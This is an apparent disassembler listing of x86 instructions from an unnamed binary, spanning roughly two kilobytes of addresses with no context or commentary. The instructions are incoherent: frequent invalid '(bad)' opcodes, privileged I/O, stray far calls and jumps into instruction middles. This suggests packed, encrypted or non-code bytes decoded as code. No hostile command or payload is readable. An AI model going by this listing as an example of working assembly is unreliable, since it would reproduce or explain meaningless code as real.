  4021b1:	add    eax,0xa19873f5
  4021b6:	sub    ecx,edx
  4021b8:	push   eax
  4021b9:	mov    bh,0xcf
  4021bb:	mov    BYTE PTR [ebx],ch
  4021bd:	pop    ss
  4021be:	push   esp
  4021bf:	ins    BYTE PTR es:[edi],dx
  4021c0:	arpl   WORD PTR [esi+0x7436ca67],cx
  4021c6:	(bad)  
  4021c7:	mov    al,0x5c
  4021c9:	jg     0x402177
  4021cb:	addr16 jl 0x402205
  4021ce:	xchg   ecx,eax
  4021cf:	sub    BYTE PTR [ecx+0x5ba2dd49],bh
  4021d5:	or     BYTE PTR [edi-0x34635967],al
  4021db:	adc    edx,eax
  4021dd:	imul   BYTE PTR cs:[ebp-0xac28a8f]
  4021e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021e5:	(bad)  
  4021e6:	add    al,0x37
  4021e8:	push   ecx
  4021e9:	popf   
  4021ea:	dec    esp
  4021eb:	sti    
  4021ec:	dec    eax
  4021ed:	rcr    BYTE PTR [esi+0x6f32990e],1
  4021f3:	lea    ebp,[ebp-0x63]
  4021f6:	or     BYTE PTR ds:0xf756a2a0,0x6d
  4021fd:	mov    ds:0x55284c4f,eax
  402202:	test   DWORD PTR [ebx-0x69865094],0x38a84da0
  40220c:	cli    
  40220d:	add    al,ah
  40220f:	mov    ecx,0xcaafda5d
  402214:	push   ecx
  402215:	pop    eax
  402216:	sbb    DWORD PTR [edx],0xffffff95
  402219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40221a:	fisttp WORD PTR [eax+0x6c0353a2]
  402220:	daa    
  402221:	mov    eax,ds
  402223:	hlt    
  402224:	repnz int3 
  402226:	cmc    
  402227:	imul   edi,DWORD PTR [edi+eiz*8+0x684a8014],0xffffffc0
  40222f:	push   ds
  402230:	sbb    ch,BYTE PTR [eax-0x37386fe9]
  402236:	retf   
  402237:	dec    edi
  402238:	and    BYTE PTR [ecx+0x71],ch
  40223b:	in     al,0xdf
  40223d:	gs in  eax,0xd5
  402240:	stos   DWORD PTR es:[edi],eax
  402241:	ins    DWORD PTR es:[edi],dx
  402242:	jle    0x40222b
  402244:	std    
  402245:	(bad)  
  402246:	xor    al,0x64
  402248:	fld    QWORD PTR [edx]
  40224a:	xlat   BYTE PTR ds:[ebx]
  40224b:	call   0x2834:0xc234a629
  402252:	mov    eax,0x776dda3e
  402257:	fisubr DWORD PTR [eax-0x4a]
  40225a:	dec    DWORD PTR [edi-0x582990e4]
  402260:	int    0xfe
  402262:	lock jl 0x40223a
  402265:	clc    
  402266:	xor    ecx,esp
  402268:	or     ebx,DWORD PTR [edx+0x7d4c4193]
  40226e:	sbb    eax,esp
  402270:	xchg   BYTE PTR [ebp+0x54],cl
  402273:	call   0x7ab8:0x8c36af79
  40227a:	aas    
  40227b:	or     eax,0x73cbfd00
  402280:	in     al,0x7a
  402282:	inc    ebx
  402283:	sbb    ebx,DWORD PTR [edx]
  402285:	pop    ds
  402286:	jo     0x4022d8
  402288:	aaa    
  402289:	adc    ecx,ebx
  40228b:	adc    esp,DWORD PTR [edx-0x42069e2b]
  402291:	adc    eax,0x7d472d17
  402296:	mov    edx,0xc720a3c6
  40229b:	sbb    BYTE PTR [edx+0x5354de65],al
  4022a1:	loop   0x4022f9
  4022a3:	clc    
  4022a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022a5:	push   ss
  4022a6:	call   0xd7ad:0xbafdfb7c
  4022ad:	fs repz cmp al,0x6b
  4022b1:	std    
  4022b2:	push   0x62
  4022b4:	sub    BYTE PTR [ecx+ebx*2-0x37],0xed
  4022b9:	aam    0x29
  4022bb:	xchg   ebp,eax
  4022bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022bd:	ins    BYTE PTR es:[edi],dx
  4022be:	adc    BYTE PTR [ebx+0x39],0x8c
  4022c2:	xchg   ebx,eax
  4022c3:	fnsave [ebx-0x29]
  4022c6:	xchg   ecx,eax
  4022c7:	out    dx,eax
  4022c8:	test   BYTE PTR [edi],al
  4022ca:	loop   0x4022ba
  4022cc:	jmp    0x21f8:0xfa74d830
  4022d3:	ds cwde 
  4022d5:	push   esi
  4022d6:	sub    dh,ah
  4022d8:	scas   al,BYTE PTR es:[edi]
  4022d9:	mov    bh,0x43
  4022db:	hlt    
  4022dc:	mov    DWORD PTR [edi],ebp
  4022de:	out    0x96,al
  4022e0:	pop    es
  4022e1:	push   esi
  4022e2:	jbe    0x402285
  4022e4:	or     al,bh
  4022e6:	test   eax,0xed2e9fbe
  4022eb:	sahf   
  4022ec:	mov    esp,0x74b1341f
  4022f1:	adc    bh,ch
  4022f3:	xchg   edi,eax
  4022f4:	fisttp WORD PTR [ebx+0x5c]
  4022f7:	adc    edx,DWORD PTR [ecx]
  4022f9:	aad    0x47
  4022fb:	mov    eax,DWORD PTR [ebp-0x1]
  4022fe:	fisub  WORD PTR [ebx]
  402300:	jbe    0x40233d
  402302:	scas   al,BYTE PTR es:[edi]
  402303:	ret    0xd763
  402306:	dec    esi
  402307:	das    
  402308:	fimul  DWORD PTR [edx+0x58a52114]
  40230e:	fiadd  WORD PTR [eax+0x48]
  402311:	std    
  402312:	(bad)  
  402313:	scas   eax,DWORD PTR es:[edi]
  402314:	std    
  402315:	scas   eax,DWORD PTR es:[edi]
  402316:	sbb    eax,0x2ece1481
  40231b:	pop    eax
  40231c:	(bad)  
  40231d:	mov    esp,0x9c45066e
  402322:	icebp  
  402323:	sbb    eax,0x563bec4b
  402328:	add    al,0x58
  40232a:	adc    ecx,DWORD PTR [ebx]
  40232c:	jbe    0x4022ae
  40232e:	mov    esp,DWORD PTR ds:0xb6fe41d8
  402334:	fnsave [ecx]
  402336:	xor    BYTE PTR [ecx-0x24],dl
  402339:	cmc    
  40233a:	mov    DWORD PTR [edx],edx
  40233c:	dec    edi
  40233d:	mov    esi,0x214eee51
  402342:	sbb    ebx,ebx
  402344:	mov    ah,0x6
  402346:	xchg   esi,eax
  402347:	outs   dx,DWORD PTR ds:[esi]
  402348:	cmp    eax,0x283de21a
  40234d:	iret   
  40234e:	les    ebp,FWORD PTR [ecx-0x15920cd3]
  402354:	push   eax
  402355:	jle    0x402308
  402357:	add    BYTE PTR [ebp-0x37],ch
  40235a:	pop    ecx
  40235b:	push   edi
  40235c:	cdq    
  40235d:	xor    dh,BYTE PTR [eax-0x3333d007]
  402363:	in     al,dx
  402364:	fst    DWORD PTR [esi]
  402366:	xor    DWORD PTR [ebx+0x22],ebp
  402369:	(bad)  
  40236a:	aad    0x81
  40236c:	jg     0x40231d
  40236e:	mov    ebx,0xafb79297
  402373:	mov    dl,0xdf
  402375:	ja     0x40237a
  402377:	sar    BYTE PTR [ecx],1
  402379:	dec    ebp
  40237a:	xor    eax,0x9bdb3c5e
  40237f:	mov    ds:0x55239fcf,al
  402384:	mov    bh,0xc4
  402386:	rcl    DWORD PTR [ebp-0x2f75519c],1
  40238c:	aaa    
  40238d:	int3   
  40238e:	sub    al,0x34
  402390:	xor    al,0xd2
  402392:	lahf   
  402393:	lock push 0xb28128ae
  402399:	(bad)  
  40239a:	pop    ebx
  40239b:	mov    dh,0x81
  40239d:	lods   eax,DWORD PTR ds:[esi]
  40239e:	lods   al,BYTE PTR ds:[esi]
  40239f:	es out 0x9c,al
  4023a2:	mov    esi,esi
  4023a4:	retf   0xaef4
  4023a7:	popa   
  4023a8:	xor    eax,0x4026afb3
  4023ad:	(bad)  
  4023ae:	sub    BYTE PTR [ebp+0x1e],bh
  4023b1:	mov    ecx,0x139407de
  4023b6:	and    ecx,esi
  4023b8:	jno    0x402349
  4023ba:	sbb    DWORD PTR [edx+0x4],0xffffffda
  4023be:	fwait
  4023bf:	out    dx,al
  4023c0:	jmp    0x6ff4ef06
  4023c5:	aaa    
  4023c6:	mov    ecx,0xcee96c98
  4023cb:	xor    dl,BYTE PTR [ebx-0x72976f48]
  4023d1:	inc    ebp
  4023d2:	xor    cl,dh
  4023d4:	jge    0x402397
  4023d6:	(bad)  
  4023d7:	(bad)  
  4023d8:	out    dx,al
  4023d9:	ins    DWORD PTR es:[edi],dx
  4023da:	lods   eax,DWORD PTR ds:[esi]
  4023db:	shl    cl,0x59
  4023de:	je     0x402373
  4023e0:	sar    BYTE PTR [esi+0x77],0xe1
  4023e4:	jg     0x4023ed
  4023e6:	addr16 mov ch,0xcd
  4023e9:	test   al,0x12
  4023ec:	mov    dh,cl
  4023ee:	mov    ds:0xa1b138a8,al
  4023f3:	adc    al,0x3f
  4023f5:	leave  
  4023f6:	cwde   
  4023f7:	jno    0x4023f8
  4023f9:	add    eax,0x88a4e62b
  4023fe:	jnp    0x40245d
  402400:	test   al,0x95
  402402:	vpmacssdqh xmm6,xmm2,XMMWORD PTR [ecx-0x71],xmm7
  402409:	arpl   bp,bp
  40240b:	in     eax,0x10
  40240d:	jb     0x4023e7
  40240f:	mov    dh,0x1c
  402411:	jno    0x402409
  402413:	scas   al,BYTE PTR es:[edi]
  402414:	mov    edx,0x62280972
  402419:	ins    BYTE PTR es:[edi],dx
  40241a:	xor    eax,0x9db0b5fc
  40241f:	(bad)  
  402420:	not    bl
  402422:	mov    edi,DWORD PTR [edi+ecx*4]
  402425:	ror    BYTE PTR [ebp-0x2db8ac12],0xe0
  40242c:	(bad)  
  40242d:	sub    al,0x67
  40242f:	pushf  
  402430:	xchg   edi,eax
  402431:	dec    ecx
  402432:	xor    al,0xb8
  402434:	in     eax,0x23
  402436:	rol    BYTE PTR [edi],0xa
  402439:	push   ds
  40243a:	and    eax,0xe58f7158
  40243f:	mov    bh,0x2b
  402441:	sbb    esp,DWORD PTR [esi-0x75]
  402444:	mov    al,ds:0x8c547cdc
  402449:	pop    edx
  40244a:	inc    eax
  40244b:	addr16 test eax,0xbc863f24
  402451:	cmp    ch,BYTE PTR [edi]
  402453:	add    BYTE PTR [ecx+0x8],al
  402456:	out    dx,al
  402457:	sbb    ebx,eax
  402459:	dec    ebx
  40245a:	mov    al,0xce
  40245c:	xor    BYTE PTR [ebx+0x5d00be99],dh
  402462:	sbb    ecx,eax
  402464:	and    BYTE PTR [edi-0x35c73b5b],cl
  40246a:	fild   DWORD PTR [ebp-0x22]
  40246d:	sbb    al,BYTE PTR [edx+0x6c35c831]
  402473:	(bad)  
  402474:	dec    ebx
  402475:	mov    WORD PTR [ebx],es
  402477:	push   edx
  402478:	ret    
  402479:	scas   eax,DWORD PTR es:[edi]
  40247a:	or     bl,ch
  40247c:	stos   DWORD PTR es:[edi],eax
  40247d:	jl     0x4024b7
  40247f:	sub    cl,0x3f
  402482:	lods   eax,DWORD PTR ss:[esi]
  402484:	in     eax,0xf5
  402486:	cld    
  402487:	scas   eax,DWORD PTR es:[edi]
  402488:	mov    al,0x25
  40248a:	cmc    
  40248b:	inc    ebp
  40248c:	dec    esp
  40248d:	sbb    al,0x70
  40248f:	push   ebx
  402490:	mov    esi,0xbc1be5d1
  402495:	mov    ebp,DWORD PTR [ebp+ebp*2-0x57f69e4c]
  40249c:	(bad)  
  40249f:	jecxz  0x402453
  4024a1:	and    al,0x40
  4024a3:	data16 aam 0x37
  4024a6:	push   esi
  4024a7:	jno    0x40250b
  4024a9:	mov    eax,0x222c3324
  4024ae:	je     0x4024ec
  4024b0:	inc    ebx
  4024b1:	ss cmc 
  4024b3:	in     ax,dx
  4024b5:	xchg   esp,eax
  4024b6:	jl     0x40250f
  4024b8:	and    ebp,0xffffffcb
  4024bb:	dec    BYTE PTR [eax+0x40198cf0]
  4024c1:	es dec esi
  4024c3:	xlat   BYTE PTR ds:[ebx]
  4024c4:	jb     0x7ba9bf95
  4024ca:	(bad)  
  4024cb:	sahf   
  4024cc:	sahf   
  4024cd:	ss mov ebp,0xd261fc90
  4024d3:	jg     0x40252c
  4024d5:	stos   DWORD PTR es:[edi],eax
  4024d6:	ja     0x40253a
  4024d8:	fmul   st,st(5)
  4024da:	cld    
  4024db:	in     eax,dx
  4024dc:	or     al,0xc3
  4024de:	lock xor cl,ah
  4024e1:	mov    al,ds:0x7fb836a2
  4024e6:	enter  0x1758,0xac
  4024ea:	stos   BYTE PTR es:[edi],al
  4024eb:	nop
  4024ec:	aaa    
  4024ed:	sbb    BYTE PTR [eax+0x2d],cl
  4024f0:	or     DWORD PTR [edx-0x41c4588c],ebx
  4024f6:	dec    ebx
  4024f7:	pop    eax
  4024f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024f9:	sbb    ch,dl
  4024fb:	fidiv  WORD PTR [edx-0x65]
  4024fe:	xor    BYTE PTR [ecx-0xe],0xf8
  402502:	pop    ebp
  402504:	fimul  WORD PTR [edi-0x6e]
  402507:	std    
  402508:	jmp    0x79c0:0x3596b0e7
  40250f:	inc    eax
  402510:	mov    eax,0xeb48a74b
  402515:	imul   ebp,ecx,0x31
  402518:	repz pop edx
  40251a:	pop    ecx
  40251b:	jmp    0x4950:0xe7ace171
  402522:	pop    ebp
  402523:	cmp    eax,0x82b68a75
  402528:	mov    eax,0xb4943cb1
  40252d:	inc    esp
  40252e:	pop    edi
  40252f:	push   ebx
  402530:	call   0x210ffdb0
  402535:	mov    es,WORD PTR [edi+0x57]
  402538:	(bad)  
  402539:	(bad)  
  40253a:	cs sbb eax,0x57f37671
  402540:	loop   0x4025a3
  402542:	push   esi
  402543:	call   DWORD PTR [ebp+edi*4+0x1]
  402547:	fcmovnbe st,st(6)
  402549:	sar    ah,1
  40254b:	lahf   
  40254c:	or     bh,BYTE PTR [ebx+0x4b019201]
  402552:	adc    ebp,DWORD PTR [edi+0xe]
  402555:	scas   al,BYTE PTR es:[edi]
  402556:	inc    eax
  402557:	call   0xdfc0:0x3972d3f2
  40255e:	add    esi,edx
  402560:	ins    DWORD PTR es:[edi],dx
  402561:	sub    dl,0x11
  402564:	inc    ebp
  402565:	pop    ds
  402566:	pop    ds
  402567:	jo     0x4025be
  402569:	sbb    ecx,0x6d
  40256c:	add    DWORD PTR [ebx+0x35d8feb5],ebp
  402572:	scas   al,BYTE PTR es:[edi]
  402573:	or     dl,BYTE PTR [edx*4-0x3233ed39]
  40257a:	cmc    
  40257b:	jg     0x4025ec
  40257d:	xlat   BYTE PTR ds:[ebx]
  40257e:	repnz mov bl,0xdd
  402581:	mov    cl,0x24
  402583:	add    DWORD PTR [eax],0xab0eb82b
  402589:	sub    DWORD PTR [esi-0x7bd45bbf],esp
  40258f:	adc    edx,DWORD PTR [ebx]
  402591:	sbb    eax,0x42a7ebc
  402596:	mov    al,0x1f
  402598:	xchg   ecx,eax
  402599:	ret    
  40259a:	repnz adc BYTE PTR [edx],cl
  40259d:	iret   
  40259e:	test   BYTE PTR [ebx-0x126f9ce6],0x3
  4025a5:	mov    BYTE PTR [ecx-0x292f2852],al
  4025ab:	xchg   ebx,eax
  4025ac:	les    edi,FWORD PTR [edi-0x64]
  4025af:	ficom  DWORD PTR [ebx+0x6a4b8313]
  4025b5:	retf   
  4025b6:	xchg   DWORD PTR [esi-0x9],edi
  4025b9:	xchg   DWORD PTR [edx],ebp
  4025bb:	sbb    eax,0x564e7659
  4025c0:	or     cl,BYTE PTR ds:0x58144350
  4025c6:	pop    eax
  4025c7:	ds daa 
  4025c9:	xor    bl,BYTE PTR [eax]
  4025cb:	sub    eax,ebx
  4025cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025ce:	loopne 0x4025ba
  4025d0:	sbb    ch,BYTE PTR [ecx-0x24e55f01]
  4025d6:	and    DWORD PTR [ecx+0x2ae2e6f],0x2a
  4025dd:	mov    BYTE PTR [edx+esi*8-0x64],ch
  4025e1:	ins    BYTE PTR es:[edi],dx
  4025e2:	and    cl,BYTE PTR [eax]
  4025e4:	iret   
  4025e5:	sbb    eax,0xd6ba0012
  4025ea:	dec    ecx
  4025eb:	mov    bl,0x1a
  4025ed:	pcmpgtb mm7,QWORD PTR ds:0x95b28d1f
  4025f4:	dec    esi
  4025f5:	mov    BYTE PTR es:[edi],bh
  4025f8:	mov    esp,0x41c34f32
  4025fd:	fwait
  4025fe:	push   esi
  4025ff:	or     eax,DWORD PTR [edx+0x28]
  402602:	cmp    esp,DWORD PTR [edx+ebp*2+0x76]
  402606:	inc    esi
  402607:	mov    edi,0x8a332efb
  40260c:	xchg   ecx,eax
  40260d:	(bad)  
  40260e:	inc    edi
  40260f:	ss call 0xccf4:0x5c6acc7e
  402617:	cld    
  402618:	xchg   esp,eax
  402619:	fwait
  40261a:	repnz popa 
  40261c:	sti    
  40261d:	fistp  WORD PTR [edx+0x7aa53a]
  402623:	cmp    ah,BYTE PTR [ebx+eiz*2-0x7f]
  402627:	push   edx
  402628:	xor    eax,0x1f220700
  40262d:	lahf   
  40262e:	inc    esi
  40262f:	fadd   st(4),st
  402631:	inc    ecx
  402632:	shr    DWORD PTR [ebx*1+0x445d35b3],1
  402639:	dec    BYTE PTR [eax+eax*8]
  40263c:	mov    ch,0x33
  40263e:	jle    0x402676
  402640:	sahf   
  402641:	jo     0x4025f6
  402643:	mov    edx,0xea0fcf16
  402648:	in     al,0x4d
  40264a:	loopne 0x402698
  40264c:	and    DWORD PTR [esi-0x4e1d13ea],ecx
  402652:	push   ebp
  402653:	std    
  402654:	or     al,dl
  402656:	push   cs
  402657:	add    eax,0xcfe48e54
  40265c:	addr16 mov ds:0xf1bc,al
  402660:	xlat   BYTE PTR ds:[ebx]
  402661:	add    DWORD PTR [ebx-0x50],ebp
  402664:	aam    0x24
  402666:	or     BYTE PTR [edi+0xb1a6791],0x4e
  40266d:	stc    
  40266e:	shr    ah,cl
  402670:	push   es
  402671:	pushf  
  402672:	test   DWORD PTR [ebx+ebp*2],esi
  402675:	push   0x5044eab7
  40267a:	jbe    0x402660
  40267c:	sbb    eax,0x118b69d7
  402681:	clc    
  402682:	push   0x7dc1b888
  402687:	sbb    eax,0xa3ce6eb5
  40268c:	cli    
  40268d:	loop   0x40269e
  40268f:	or     al,0x93
  402691:	mov    ch,BYTE PTR ds:0x9a94477e
  402697:	jp     0x40264e
  402699:	jne    0x402630
  40269b:	and    eax,0xfbc9ead6
  4026a0:	sub    al,0x5e
  4026a2:	mov    ah,0x83
  4026a4:	sub    dl,0x9f
  4026a7:	inc    ecx
  4026a8:	push   0x943660db
  4026ad:	loopne 0x402662
  4026af:	icebp  
  4026b0:	xchg   ecx,eax
  4026b1:	das    
  4026b2:	dec    esp
  4026b3:	cdq    
  4026b4:	fs mov edi,0xdf25119f
  4026ba:	push   edi
  4026bb:	sub    esp,DWORD PTR ds:0x5a9f4d7
  4026c1:	daa    
  4026c2:	les    ebx,FWORD PTR [ebx]
  4026c4:	dec    esi
  4026c5:	mov    ah,bl
  4026c7:	mov    dh,0x47
  4026c9:	loope  0x40266d
  4026cb:	push   es
  4026cc:	rcr    BYTE PTR [edx],cl
  4026ce:	pusha  
  4026cf:	mov    eax,ds:0xf82e52b9
  4026d4:	mov    edi,DWORD PTR [ebp+0x3c77fcdd]
  4026da:	(bad)  
  4026db:	pop    ss
  4026dc:	mov    dl,BYTE PTR [ebp+0x3e]
  4026df:	mov    eax,0xc03dcf
  4026e4:	adc    eax,DWORD PTR [esi+ecx*4-0x29]
  4026e8:	or     DWORD PTR [ecx-0x46366709],ecx
  4026ee:	jae    0x402763
  4026f0:	pop    ebp
  4026f1:	call   0xa477:0xc8362073
  4026f8:	sti    
  4026f9:	je     0x402724
  4026fb:	jecxz  0x4026e5
  4026fd:	push   es
  4026fe:	test   BYTE PTR [ebx+0x45],0xa9
  402702:	ins    BYTE PTR es:[edi],dx
  402703:	popa   
  402704:	sub    BYTE PTR [eax+0x4a],ch
  402707:	xor    eax,edx
  402709:	mov    ah,0xac
  40270b:	mov    ebp,0x5e7d8e76
  402710:	jns    0x4026b3
  402712:	cmp    eax,DWORD PTR [edx]
  402714:	cmp    eax,ebx
  402716:	push   es
  402717:	sub    al,0xcb
  402719:	xchg   ebx,eax
  40271a:	in     eax,0x37
  40271c:	push   esp
  40271d:	loopne 0x4026eb
  40271f:	cmp    al,0xb4
  402721:	sar    BYTE PTR [ebx],cl
  402723:	aad    0xce
  402725:	pop    es
  402726:	pop    edi
  402727:	dec    ebp
  402728:	mov    DWORD PTR [ecx-0x2459878c],edi
  40272e:	jp     0x40273c
  402730:	dec    ebp
  402731:	sahf   
  402732:	jge    0x402708
  402734:	or     ebp,DWORD PTR [esi]
  402736:	in     al,0x8e
  402738:	pushf  
  402739:	js     0x40277e
  40273b:	out    dx,eax
  40273c:	push   ebp
  40273d:	and    eax,0x578d5e24
  402742:	(bad)  
  402743:	sar    BYTE PTR [eax+0x6b],1
  402746:	xchg   BYTE PTR [eax-0x4],bh
  402749:	xor    cl,BYTE PTR [ebx+0x38fa23bd]
  40274f:	js     0x4026e1
  402751:	xchg   ecx,eax
  402752:	or     ebp,edx
  402754:	inc    esp
  402755:	bswap  ebx
  402757:	pop    ds
  402758:	gs mov bl,0x92
  40275b:	pmaxub mm1,mm3
  40275e:	fstp   TBYTE PTR [esi]
  402761:	inc    esi
  402762:	lods   eax,DWORD PTR ds:[esi]
  402763:	ins    DWORD PTR es:[edi],dx
  402764:	sub    DWORD PTR [ebx-0x1],0x6
  402768:	mov    ebx,0xd374d886
  40276d:	xchg   ebp,eax
  40276e:	mov    ebx,0x874a30ab
  402773:	shl    DWORD PTR [edx+0x41],cl
  402776:	mov    eax,ds:0x10118746
  40277b:	push   edx
  40277c:	xor    eax,0xb2ef0d94
  402781:	ds push 0x1ef23a86
  402787:	aam    0x9c
  402789:	inc    edx
  40278a:	in     eax,0xc8
  40278c:	test   al,0xf2
  40278e:	mov    ebx,0xc33f0162
  402793:	push   esp
  402794:	std    
  402795:	push   ds
  402796:	frstor [ecx+ebx*2-0x11774a53]
  40279d:	fs sub al,0x7e
  4027a0:	out    0xa9,al
  4027a2:	xor    eax,0xffd6c2bf
  4027a7:	in     eax,dx
  4027a8:	es dec ebx
  4027aa:	inc    ecx
  4027ab:	xor    al,0x7e
  4027ad:	mov    eax,0x8ec1b85a
  4027b2:	sbb    bl,BYTE PTR [ecx]
  4027b4:	jl     0x40275a
  4027b6:	gs mov bl,0x2a
  4027b9:	adc    eax,DWORD PTR [eax+0x3257c026]
  4027bf:	imul   edi,DWORD PTR [ebp+0x55],0x50
  4027c3:	mov    dl,0x43
  4027c5:	inc    esi
  4027c6:	jb     0x4027ae
  4027c8:	scas   eax,DWORD PTR es:[edi]
  4027c9:	xor    al,0x37
  4027cb:	stos   DWORD PTR es:[edi],eax
  4027cc:	sbb    bh,BYTE PTR ds:0x37f0e6dc
  4027d2:	sbb    BYTE PTR [eax-0x4b85094],0x30
  4027d9:	sbb    al,0x7e
  4027db:	pop    es
  4027dc:	aad    0xcd
  4027de:	inc    ecx
  4027df:	fwait
  4027e0:	sub    edx,DWORD PTR [edi]
  4027e2:	retf   
  4027e3:	jae    0x4027ad
  4027e5:	scas   al,BYTE PTR es:[edi]
  4027e6:	leave  
  4027e7:	mov    ecx,0x7db689e0
  4027ec:	sub    dl,bh
  4027ee:	sbb    DWORD PTR [edi],0xffffffe0
  4027f1:	(bad)  
  4027f2:	and    esi,ebx
  4027f4:	xchg   esp,eax
  4027f5:	jge    0x402823
  4027f7:	mov    edi,0x4b7cd9df
  4027fc:	out    dx,eax
  4027fd:	loop   0x40282c
  4027ff:	lea    ebp,[ecx]
  402801:	cmp    bl,bl
  402803:	scas   eax,DWORD PTR es:[edi]
  402804:	mov    ecx,0x5c5ee45c
  402809:	mov    edi,0x27f13fe2
  40280e:	jp     0x40286c
  402810:	loop   0x40281e
  402812:	jae    0x40283c
  402814:	pushf  
  402815:	ins    DWORD PTR es:[edi],dx
  402816:	xchg   edx,eax
  402817:	stc    
  402818:	in     al,0x66
  40281a:	xchg   ebx,eax
  40281b:	loop   0x4027ed
  40281d:	mov    cs,WORD PTR [esi+0x76]
  402820:	repnz les esi,FWORD PTR [esi-0x1ceed73d]
  402827:	mov    WORD PTR [ebx],ss
  402829:	arpl   sp,bp
  40282b:	and    BYTE PTR [eax+0xc],dh
  40282e:	xchg   ebx,eax
  40282f:	pop    ss
  402830:	fs leave 
  402832:	cmp    eax,0x59651eb9
  402837:	jae    0x402894
  402839:	iret   
  40283a:	test   dh,ch
  40283c:	pop    ebx
  40283d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40283e:	inc    ecx
  40283f:	dec    edi
  402840:	mov    ?,WORD PTR [ecx]
  402842:	jl     0x4027db
  402844:	xchg   edx,eax
  402845:	std    
  402846:	arpl   WORD PTR [ebx-0x60],sp
  402849:	popa   
  40284a:	pop    eax
  40284b:	ins    DWORD PTR es:[edi],dx
  40284c:	jp     0x402852
  40284e:	xchg   ebx,eax
  40284f:	jbe    0x40285d
  402851:	jmp    0xc1643d00
  402856:	cmp    edi,DWORD PTR [ecx]
  402858:	bound  eax,QWORD PTR [ebp+0x4af6ce2]
  40285e:	dec    ecx
  40285f:	and    al,0x7e
  402861:	out    0x11,eax
  402863:	lods   al,BYTE PTR ds:[esi]
  402864:	div    BYTE PTR [edx+0x17]
  402867:	pusha  
  402868:	addr16 jle 0x40287a
  40286b:	in     al,dx
  40286c:	aaa    
  40286d:	or     DWORD PTR [ebx-0x2bb17cd9],esp
  402873:	jmp    0x4028f4
  402875:	sub    eax,DWORD PTR [ebx+0x65ba5c6e]
  40287b:	in     al,dx
  40287c:	fwait
  40287d:	dec    edx
  40287e:	or     eax,0x98b2b301
  402883:	out    0x8c,al
  402885:	cmp    DWORD PTR [edi],0x72
  402888:	push   edi
  402889:	jecxz  0x40285c
  40288b:	push   cs
  40288c:	or     BYTE PTR [edi-0x76],dl
  40288f:	xor    eax,0x19e66f9
  402894:	into   
  402895:	xchg   ecx,eax
  402896:	mov    BYTE PTR gs:[eax-0x1a484a47],bh
  40289d:	rol    BYTE PTR [eax+0x36b2bd9d],cl
  4028a3:	es cmp al,0x7a
  4028a6:	sar    BYTE PTR [ebp-0x1ad1adf1],0x3c
  4028ad:	xor    eax,0x2c98153a
  4028b2:	xor    BYTE PTR [edx+0xd],0x93
  4028b6:	add    BYTE PTR [ecx+eax*4+0x7a],cl
  4028ba:	xchg   BYTE PTR [ecx+0x6a19c4b4],bl
  4028c0:	cmc    
  4028c1:	or     eax,eax
  4028c3:	mov    bh,0x29
  4028c5:	outs   dx,BYTE PTR ds:[esi]
  4028c6:	(bad)  
  4028c7:	jo     0x40292a
  4028c9:	aam    0x6c
  4028cb:	xchg   BYTE PTR [edi],dh
  4028cd:	(bad)  
  4028ce:	mov    ecx,0xee0f0d08
  4028d3:	cld    
  4028d4:	sbb    al,0x87
  4028d6:	data16 into 
  4028d8:	not    dh
  4028da:	add    edi,esi
  4028dc:	pop    esp
  4028dd:	push   es
  4028de:	nop
  4028df:	jmp    0x4a949089
  4028e4:	xor    eax,0xe1a132ce
  4028e9:	pop    edx
  4028ea:	fcmovne st,st(3)
  4028ec:	mov    ebp,DWORD PTR [esi]
  4028ee:	enter  0xb4ae,0x4f
  4028f2:	nop
  4028f3:	aas    
  4028f4:	sbb    eax,0x50351421
  4028f9:	push   esp
  4028fa:	dec    ebx
  4028fb:	fmulp  st(1),st
  4028fd:	out    0x37,eax
  4028ff:	icebp  
  402900:	push   eax
  402901:	inc    edi
  402902:	or     ebp,0x81f07222
  402908:	xor    DWORD PTR [ebx-0x33],edi
  40290b:	adc    eax,0xb454911b
  402910:	inc    ebp
  402911:	or     ah,al
  402913:	outs   dx,BYTE PTR ss:[esi]
  402915:	xchg   ecx,eax
  402916:	push   0xffffffab
  402918:	jo     0x4028e9
  40291a:	add    BYTE PTR [ecx-0x68],bh
  40291d:	int    0x73
  40291f:	fimul  WORD PTR [edx]
  402921:	dec    edx
  402922:	inc    esi
  402923:	push   ecx
  402924:	fisttp QWORD PTR [eax]
  402926:	pop    ds
  402927:	sbb    DWORD PTR [ebp+0x2d2a2807],ebx
  40292d:	inc    edx
  40292e:	push   ecx
  40292f:	jnp    0x402943
  402931:	(bad)  ds:0xde06ffa
  402937:	lds    esp,FWORD PTR [esi-0x29e09537]
  40293d:	inc    edx
  40293e:	ss jo  0x4029ba
  402941:	hlt    
  402942:	stos   DWORD PTR es:[edi],eax
  402943:	and    al,0xe9
  402945:	mov    es,WORD PTR [edi]
  402947:	dec    eax
  402948:	jne    0x40295b
  40294a:	mov    ecx,0xe5f1561d
  40294f:	std    
  402950:	into   
  402951:	lahf   
  402952:	push   eax
  402953:	mov    ah,0xd2
  402955:	pop    ds
  402956:	xchg   ebp,eax
  402957:	cmp    al,BYTE PTR [esi-0x23bbc552]
  40295d:	jnp    0x402935
  40295f:	xor    BYTE PTR [eax-0x51],al
  402962:	sahf   
  402963:	sbb    bh,BYTE PTR [eax-0x2b1649a2]
  402969:	mov    eax,DWORD PTR [esp+esi*8]
  40296c:	int3   
  40296d:	aaa    
  40296e:	mov    esi,0x4e2eecc6
  402973:	jmp    0x402949
  402975:	test   eax,0xef14c088
  40297a:	pop    ebp
  40297b:	fimul  DWORD PTR [edx+ecx*8+0x4feb1c0e]
  402982:	and    DWORD PTR [ebx],esi
  402984:	dec    ebx
  402985:	fstp   QWORD PTR [ecx]
  402987:	pop    es
  402988:	xchg   esi,eax
  402989:	and    eax,0x4e81889f
  40298e:	clc    
  40298f:	cmp    BYTE PTR [ebx+0x15],dh
  402992:	pushf  
  402993:	aas    
  402994:	aas    
  402995:	inc    eax
  402996:	out    0xb8,al
  402998:	dec    edi
  402999:	push   edi
  40299a:	fcmovbe st,st(5)
  40299c:	fld    DWORD PTR [edi-0x12]
  40299f:	in     al,0xae
  4029a1:	pop    ebx
  4029a2:	aaa    
  4029a3:	out    0x3a,eax
  4029a5:	in     al,dx
  4029a6:	push   ecx
